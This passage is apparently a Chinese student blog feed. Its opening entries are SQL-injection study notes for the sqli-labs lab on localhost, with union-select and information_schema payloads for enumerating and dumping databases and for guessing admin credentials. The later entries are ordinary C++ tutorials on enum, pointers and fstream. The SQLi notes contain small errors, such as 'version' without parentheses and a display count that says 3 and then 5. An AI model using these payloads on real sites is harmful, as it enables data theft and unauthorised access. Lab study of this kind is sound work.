    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="判断注入类型"><a href="#判断注入类型" class="headerlink" title="判断注入类型"></a>判断注入类型</h1><h2 id="数字型注入"><a href="#数字型注入" class="headerlink" title="数字型注入"></a>数字型注入</h2><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1%27%E6%97%B6%EF%BC%8C%E5%9B%A0%E4%B8%BA%E6%9C%89%E4%B8%80%E4%B8%AA%E5%A4%9A%E4%BD%99%E7%9A%84%22%E5%8D%95%E5%BC%95%E5%8F%B7%22%E4%BD%BF%E6%9F%A5%E8%AF%A2%E8%AF%AD%E5%8F%A5%E9%94%99%E8%AF%AF" >http://127.0.0.1/?id=1&#39;时，因为有一个多余的&quot;单引号&quot;使查询语句错误 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;1时，没有报错</p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a> and 1&#x3D;2时，由于1&#x3D;2不成立，也会报错</p></li></ol><p>满足这三个，基本上就是数字注入了</p><h2 id="字符型注入"><a href="#字符型注入" class="headerlink" title="字符型注入"></a>字符型注入</h2><ol><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1%27%E6%97%B6%EF%BC%8C%E6%95%B0%E6%8D%AE%E5%BA%93%E8%AE%A4%E4%B8%BAid%E5%8F%AB%E5%81%9A1%27%E3%80%82%E6%9F%A5%E8%AF%A2%E4%B9%8B%E5%90%8E%E5%8F%91%E7%8E%B0%E6%B2%A1%E6%9C%89%E8%BF%99%E4%B8%AAid%E8%80%8C%E8%BF%94%E5%9B%9E%E9%94%99%E8%AF%AF%E3%80%82%EF%BC%88%E5%9C%A8%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5%E4%B8%AD%EF%BC%8C%E9%9C%80%E8%A6%81%E8%80%83%E8%99%91%E5%BC%95%E5%8F%B7%E7%9A%84%E9%97%AD%E5%90%88%EF%BC%89" >http://127.0.0.1/?id=1&#39;时，数据库认为id叫做1&#39;。查询之后发现没有这个id而返回错误。（在字符型注入中，需要考虑引号的闭合） <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p></li><li><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ and ‘1’&#x3D;’1 在’1’&#x3D;’1之后没有加上’是因为传参时输入的内容已经被’ ‘包围。</p></li></ol><h1 id="后台查询列数"><a href="#后台查询列数" class="headerlink" title="后台查询列数"></a>后台查询列数</h1><p>使用order by试出数据库列数</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ order by 数字 （如果试4时有错误，3时正确，那么列数为3）</p><h1 id="找显示位"><a href="#找显示位" class="headerlink" title="找显示位"></a>找显示位</h1><p>使用union select找出会返回客户端并显示的列。如果有3列时，应该这么写</p><p>url为 <a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,3</p><p>加入显示位是3，这就意味着数据库开放了5个“窗口”用来显示内容，用查询到的数据，在这些窗口显示数据</p><h1 id="查库名"><a href="#查库名" class="headerlink" title="查库名"></a>查库名</h1><p>联合查询：select database();</p><p>下面是查看数据库的版本和数据库信息</p><p>假如显示位是3，<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,version,database()</p><h1 id="查表名"><a href="#查表名" class="headerlink" title="查表名"></a>查表名</h1><p>找到库名以后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;’库名’ (如果库名是字符型，此处库名要转成十六进制)</p><p>information_schema:</p><p>这是一个mysql自带的库，其中保存着关于mysql服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表列的数据类型与访问权限等，所以我们查询这个库</p><h1 id="查列名"><a href="#查列名" class="headerlink" title="查列名"></a>查列名</h1><p>找到表之后，使用<a class="link"   href="http://127.0.0.1/?id=1" >http://127.0.0.1/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’表名’ (如果表名是字符型，此处库名要转成十六进制)</p><p>如果表数或列数过多，可以在最后使用limit加上limit 0，5相当于检索1-5条信息</p><p>查具体数据</p><p>找到列之后，使用<a class="link"   href="http://127.0.0.1/sqli-labs/Less-2/?id=1" >http://127.0.0.1/sqli-labs/Less-2/?id=1 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a>‘ union select 1,2,group_concat(“要查询的数据”) from 表名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
    <category term="sqli-labs" scheme="http://example.com/tags/sqli-labs/"/>
    
  </entry>
  
  <entry>
    <title>sql注入一般步骤</title>
    <link href="http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/"/>
    <id>http://example.com/2024/11/07/web/sql%E6%B3%A8%E5%85%A5/sql%E6%B3%A8%E5%85%A5%E4%B8%80%E8%88%AC%E6%AD%A5%E9%AA%A4/</id>
    <published>2024-11-07T09:38:53.000Z</published>
    <updated>2025-03-04T10:38:46.835Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="sql注入一般步骤："><a href="#sql注入一般步骤：" class="headerlink" title="sql注入一般步骤："></a>sql注入一般步骤：</h1><h2 id="第一步：通过特殊的数据库查询语句"><a href="#第一步：通过特殊的数据库查询语句" class="headerlink" title="第一步：通过特殊的数据库查询语句"></a>第一步：通过特殊的数据库查询语句</h2><h2 id="第二步：在数据库的错误返回中找到sql漏洞"><a href="#第二步：在数据库的错误返回中找到sql漏洞" class="headerlink" title="第二步：在数据库的错误返回中找到sql漏洞"></a>第二步：在数据库的错误返回中找到sql漏洞</h2><h2 id="第三步-利用sql语句猜解管理人员信息并登录管理员后台"><a href="#第三步-利用sql语句猜解管理人员信息并登录管理员后台" class="headerlink" title="第三步:利用sql语句猜解管理人员信息并登录管理员后台"></a>第三步:利用sql语句猜解管理人员信息并登录管理员后台</h2><hr><h1 id="基础语法-待补充"><a href="#基础语法-待补充" class="headerlink" title="基础语法(待补充)"></a>基础语法(待补充)</h1><p>version():查看数据库版本</p><p>database():查看使用的数据库</p><p>user():查看当前用户</p><p>limit:limit子句分批来获取所有数据</p><p>group_concat():一次性获取所有的数据库信息</p><p>information_schema.tables:包含了数据库里所有的表</p><p>table_name:表名</p><p>table_schema:数据库名</p><p>column_name:字段名</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="sql注入学习" scheme="http://example.com/categories/sql%E6%B3%A8%E5%85%A5%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="web" scheme="http://example.com/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>enum</title>
    <link href="http://example.com/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/"/>
    <id>http://example.com/2024/11/05/c%E2%81%84c++/%E6%9E%9A%E4%B8%BE%E7%B1%BB%E5%9E%8Benum/</id>
    <published>2024-11-05T18:40:53.000Z</published>
    <updated>2025-03-04T10:38:46.834Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>在C++中，<code>enum</code>（枚举）是一种用户定义的类型，它允许程序员为整型值指定更易读的名字。枚举类型主要用于表示一组命名的整数常量，使得代码更加清晰和易于维护。</p><h3 id="定义枚举"><a href="#定义枚举" class="headerlink" title="定义枚举"></a>定义枚举</h3><p>你可以使用<code>enum</code>关键字来定义一个枚举类型。下面是一个简单的例子：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED,</span><br><span class="line">    GREEN,</span><br><span class="line">    BLUE</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Color myColor = RED;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (myColor == RED) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The color is red.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>Color</code>是一个枚举类型，它有三个可能的值：<code>RED</code>、<code>GREEN</code>和<code>BLUE</code>。</p><h3 id="枚举的底层实现"><a href="#枚举的底层实现" class="headerlink" title="枚举的底层实现"></a>枚举的底层实现</h3><p>默认情况下，枚举值从0开始递增。因此，在上面的例子中，<code>RED</code>的值为0，<code>GREEN</code>的值为1，<code>BLUE</code>的值为2。你也可以显式地指定枚举值：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">enum</span> <span class="title class_">Color</span> &#123;</span><br><span class="line">    RED = <span class="number">1</span>,</span><br><span class="line">    GREEN = <span class="number">2</span>,</span><br><span class="line">    BLUE = <span class="number">4</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></div><p>在这个修改后的例子中，<code>RED</code>的值为1，<code>GREEN</code>的值为2，<code>BLUE</code>的值为4。</p><h3 id="枚举类型的使用"><a href="#枚举类型的使用" class="headerlink" title="枚举类型的使用"></a>枚举类型的使用</h3><p>枚举类型可以用于变量声明、函数参数和返回值等。例如：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum</span> <span class="title class_">Direction</span> &#123;</span><br><span class="line">    NORTH,</span><br><span class="line">    SOUTH,</span><br><span class="line">    EAST,</span><br><span class="line">    WEST</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function">Direction <span class="title">getOppositeDirection</span><span class="params">(Direction dir)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">switch</span> (dir) &#123;</span><br><span class="line">        <span class="keyword">case</span> NORTH:</span><br><span class="line">            <span class="keyword">return</span> SOUTH;</span><br><span class="line">        <span class="keyword">case</span> SOUTH:</span><br><span class="line">            <span class="keyword">return</span> NORTH;</span><br><span class="line">        <span class="keyword">case</span> EAST:</span><br><span class="line">            <span class="keyword">return</span> WEST;</span><br><span class="line">        <span class="keyword">case</span> WEST:</span><br><span class="line">            <span class="keyword">return</span> EAST;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            <span class="keyword">return</span> NORTH; <span class="comment">// 默认返回北方向，虽然这里不会发生</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Direction currentDirection = EAST;</span><br><span class="line">    Direction oppositeDirection = <span class="built_in">getOppositeDirection</span>(currentDirection);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (oppositeDirection == WEST) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The opposite direction of EAST is WEST.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h3 id="枚举类（C-11及以后）"><a href="#枚举类（C-11及以后）" class="headerlink" title="枚举类（C++11及以后）"></a>枚举类（C++11及以后）</h3><p>C++11引入了<code>enum class</code>，它提供了更强的类型安全和作用域控制。与普通的枚举不同，<code>enum class</code>的枚举值不会隐式地转换为整数，也不会与其他枚举类型相互转换。</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">enum class</span> <span class="title class_">Season</span> &#123;</span><br><span class="line">    SPRING,</span><br><span class="line">    SUMMER,</span><br><span class="line">    AUTUMN,</span><br><span class="line">    WINTER</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Season currentSeason = Season::SPRING;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (currentSeason == Season::SPRING) &#123;</span><br><span class="line">        std::cout &lt;&lt; <span class="string">&quot;The current season is spring.&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 下面的代码会导致编译错误，因为Season::SPRING不能隐式转换为int</span></span><br><span class="line">    <span class="comment">// int seasonValue = Season::SPRING; // 错误</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>在这个例子中，<code>Season</code>是一个<code>enum class</code>类型，它的值（如<code>Season::SPRING</code>）必须显式地使用<code>Season::</code>前缀来引用。</p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><ul><li>枚举（<code>enum</code>）提供了一种定义命名整数常量的方法。</li><li>枚举值默认从0开始递增，但也可以显式指定。</li><li><code>enum class</code>（C++11及以后）提供了更强的类型安全和作用域控制。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>cpp指针</title>
    <link href="http://example.com/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/"/>
    <id>http://example.com/2024/10/31/c%E2%81%84c++/cpp%E6%8C%87%E9%92%88/</id>
    <published>2024-10-31T21:13:03.000Z</published>
    <updated>2025-03-04T10:38:46.833Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p>指针是 C++ 中一种非常重要的概念，它可以让你直接操作内存。下面是指针的详细介绍和常见用法。</p><h3 id="1-指针的定义"><a href="#1-指针的定义" class="headerlink" title="1. 指针的定义"></a>1. 指针的定义</h3><p>指针是一个变量，其值为另一个变量的地址。通过指针，可以间接访问该变量。指针的声明语法如下：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line">类型 *指针名;</span><br></pre></td></tr></table></figure></div><p>例如：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p; <span class="comment">// p 是一个指向 int 类型的指针</span></span><br></pre></td></tr></table></figure></div><h3 id="2-指针的初始化"><a href="#2-指针的初始化" class="headerlink" title="2. 指针的初始化"></a>2. 指针的初始化</h3><p>指针必须被初始化后才能使用。可以通过取地址运算符 <code>&amp;</code> 来获取一个变量的地址：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> *p = &amp;a; <span class="comment">// p 指向 a 的地址</span></span><br></pre></td></tr></table></figure></div><h3 id="3-解引用指针"><a href="#3-解引用指针" class="headerlink" title="3. 解引用指针"></a>3. 解引用指针</h3><p>使用解引用运算符 <code>*</code> 可以访问指针所指向的变量的值：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> value = *p; <span class="comment">// value 现在是 10</span></span><br></pre></td></tr></table></figure></div><h3 id="4-指针的算术运算"><a href="#4-指针的算术运算" class="headerlink" title="4. 指针的算术运算"></a>4. 指针的算术运算</h3><p>指针可以进行算术运算。例如，如果有一个指针指向一个数组的首元素，可以通过指针加法来访问数组的其他元素：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> arr[] = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;;</span><br><span class="line"><span class="type">int</span> *p = arr; <span class="comment">// p 指向 arr 的首元素</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问数组元素</span></span><br><span class="line"><span class="type">int</span> first = *p;      <span class="comment">// 1</span></span><br><span class="line"><span class="type">int</span> second = *(p + <span class="number">1</span>); <span class="comment">// 2</span></span><br></pre></td></tr></table></figure></div><h3 id="5-指向指针的指针"><a href="#5-指向指针的指针" class="headerlink" title="5. 指向指针的指针"></a>5. 指向指针的指针</h3><p>指针还可以指向其他指针，形成指向指针的指针（double pointer）：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> **pp = &amp;p; <span class="comment">// pp 是一个指向指针 p 的指针</span></span><br></pre></td></tr></table></figure></div><h3 id="6-动态内存分配"><a href="#6-动态内存分配" class="headerlink" title="6. 动态内存分配"></a>6. 动态内存分配</h3><p>使用指针可以动态分配内存，常用的有 <code>new</code> 和 <code>delete</code>：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *p = <span class="keyword">new</span> <span class="type">int</span>; <span class="comment">// 动态分配一个 int</span></span><br><span class="line">*p = <span class="number">10</span>;          <span class="comment">// 给它赋值</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">delete</span> p;       <span class="comment">// 释放内存</span></span><br></pre></td></tr></table></figure></div><p>对于数组，可以这样：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> *arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">5</span>]; <span class="comment">// 动态分配一个 int 数组</span></span><br><span class="line"><span class="keyword">delete</span>[] arr;          <span class="comment">// 释放数组内存</span></span><br></pre></td></tr></table></figure></div><h3 id="7-注意事项"><a href="#7-注意事项" class="headerlink" title="7. 注意事项"></a>7. 注意事项</h3><ul><li><strong>野指针</strong>：未初始化或已经被释放的指针称为野指针，使用野指针会导致未定义行为。</li><li><strong>内存泄漏</strong>：动态分配内存后要确保及时释放，避免内存泄漏。</li></ul>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>作业</title>
    <link href="http://example.com/2024/10/22/c%E2%81%84c++/cpp%E4%BD%9C%E4%B8%9A1/"/>
    <id>http://example.com/2024/10/22/c%E2%81%84c++/cpp%E4%BD%9C%E4%B8%9A1/</id>
    <published>2024-10-22T20:30:53.000Z</published>
    <updated>2025-03-04T10:38:46.833Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。"><a href="#从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。" class="headerlink" title="从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。"></a>从键盘输入一个年份，根据闰年判断方法输出该年份的闰年情况。</h1><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    cin&gt;&gt;year;</span><br><span class="line">    <span class="keyword">if</span>((year%<span class="number">4</span>==<span class="number">0</span> <span class="keyword">and</span> year%<span class="number">100</span>!=<span class="number">0</span>) <span class="keyword">or</span> year%<span class="number">400</span>==<span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;闰年&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        cout&lt;&lt;<span class="string">&quot;不是&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><hr><h1 id="根据输入三角形的三条边长，计算并显示三角形的面积。"><a href="#根据输入三角形的三条边长，计算并显示三角形的面积。" class="headerlink" title="根据输入三角形的三条边长，计算并显示三角形的面积。"></a>根据输入三角形的三条边长，计算并显示三角形的面积。</h1><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;cmath&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">double</span> a,b,c;</span><br><span class="line">    cin&gt;&gt;a&gt;&gt;b&gt;&gt;c;</span><br><span class="line">    <span class="type">double</span> m=(a+b+c)/<span class="number">2.0</span>;</span><br><span class="line">    <span class="type">double</span> s=<span class="built_in">sqrt</span>(m*(m-a)*(m-b)*(m-c));</span><br><span class="line">    cout&lt;&lt;s;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>水个帖子。</p>]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;/assets/css/APlayer.min.css&quot;&gt;&lt;script src=&quot;/assets/js/APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="c/c++" scheme="http://example.com/categories/c-c/"/>
    
    <category term="homework" scheme="http://example.com/categories/c-c/homework/"/>
    
    
    <category term="cpp" scheme="http://example.com/tags/cpp/"/>
    
  </entry>
  
  <entry>
    <title>fstream头文件</title>
    <link href="http://example.com/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/"/>
    <id>http://example.com/2024/10/22/c%E2%81%84c++/fstream%E8%AF%B4%E6%98%8E/</id>
    <published>2024-10-22T11:30:53.000Z</published>
    <updated>2025-03-04T10:38:46.833Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="/assets/css/APlayer.min.css"><script src="/assets/js/APlayer.min.js" class="aplayer-secondary-script-marker"></script><p><code>fstream</code> 是 C++ 标准库中的一个类，它用于文件的输入输出操作。<code>fstream</code> 继承自 <code>istream</code> 和 <code>ostream</code> 类，因此它既可以用于读取文件，也可以用于写入文件。以下是关于 <code>fstream</code> 的详细解释：</p><h3 id="一、fstream-的功能"><a href="#一、fstream-的功能" class="headerlink" title="一、fstream 的功能"></a>一、<code>fstream</code> 的功能</h3><p><code>fstream</code> 类提供了对文件进行读写操作的功能。通过创建 <code>fstream</code> 类的对象，并调用其成员函数，可以方便地打开文件、读取文件内容、向文件写入数据，以及关闭文件。</p><h3 id="二、fstream-的成员函数"><a href="#二、fstream-的成员函数" class="headerlink" title="二、fstream 的成员函数"></a>二、<code>fstream</code> 的成员函数</h3><p><code>fstream</code> 类继承了许多来自 <code>istream</code> 和 <code>ostream</code> 类的成员函数，这些函数用于文件的读写操作。以下是一些常用的成员函数：</p><ol><li>**open()**：打开文件。该函数接受文件名和打开模式作为参数，并返回一个布尔值，表示文件是否成功打开。</li><li>**close()**：关闭文件。关闭文件后，将释放与文件相关的资源，并且无法再进行读写操作。</li><li>**is_open()**：检查文件是否已打开。如果文件已打开，则返回 <code>true</code>；否则返回 <code>false</code>。</li><li>**read()**：从文件中读取数据。该函数接受一个字符数组和要读取的字符数作为参数，并将读取的数据存储在数组中。</li><li>**write()**：向文件中写入数据。该函数接受一个字符数组和要写入的字符数作为参数，并将数组中的数据写入文件。</li><li><strong>seekg()</strong> 和 **seekp()**：定位文件指针。<code>seekg()</code> 用于定位输入文件指针，而 <code>seekp()</code> 用于定位输出文件指针。这两个函数可以接受一个长整型值和一个可选的查找方向作为参数。</li></ol><h3 id="三、fstream-的打开模式"><a href="#三、fstream-的打开模式" class="headerlink" title="三、fstream 的打开模式"></a>三、<code>fstream</code> 的打开模式</h3><ol><li><strong>ios::in</strong>：以读取模式打开文件。如果文件不存在，则打开操作将失败。</li><li><strong>ios::out</strong>：以写入模式打开文件。如果文件不存在，则会创建该文件；如果文件已存在，则会清空其内容。</li><li><strong>ios::ate</strong>：打开文件后，将文件指针定位到文件末尾。这通常用于在写入数据时追加到文件末尾。</li><li><strong>ios::app</strong>：以追加模式打开文件。所有写入的数据都将添加到文件末尾，而不会覆盖现有内容。</li><li><strong>ios::trunc</strong>：如果文件已存在，则在打开文件之前清空其内容。这通常与 <code>ios::out</code> 模式一起使用。</li><li><strong>ios::binary</strong>：以二进制模式打开文件。在二进制模式下，文件内容将按原样读写，不进行任何转换。</li></ol><h3 id="四、使用示例"><a href="#四、使用示例" class="headerlink" title="四、使用示例"></a>四、使用示例</h3><p>以下是一个简单的示例，演示如何使用 <code>fstream</code> 类进行文件的读写操作：</p><div class="highlight-container" data-rel="Cpp"><figure class="iseeu highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 创建 fstream 对象</span></span><br><span class="line">    std::fstream file;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件进行写入操作</span></span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, std::ios::out);</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) &#123;</span><br><span class="line">        std::cerr &lt;&lt; <span class="string">&quot;Failed to open file for writing&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 向文件写入数据</span></span><br><span class="line">    file &lt;&lt; <span class="string">&quot;Hello, World!\n&quot;</span>;</span><br><span class="line">    file.<span class="built_in">close</span>(); <span class="comment">// 关闭文件</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">// 打开文件进行读取操作</span></span><br><span class="line">    file.<span class="built_in">open</span>(<span class="string">&quot;example.txt&quot;</span>, std::ios::in);</span><br><span class="line">    <span class="keyword">if</span> (!file.<span class="built_in">is_open</span>()) 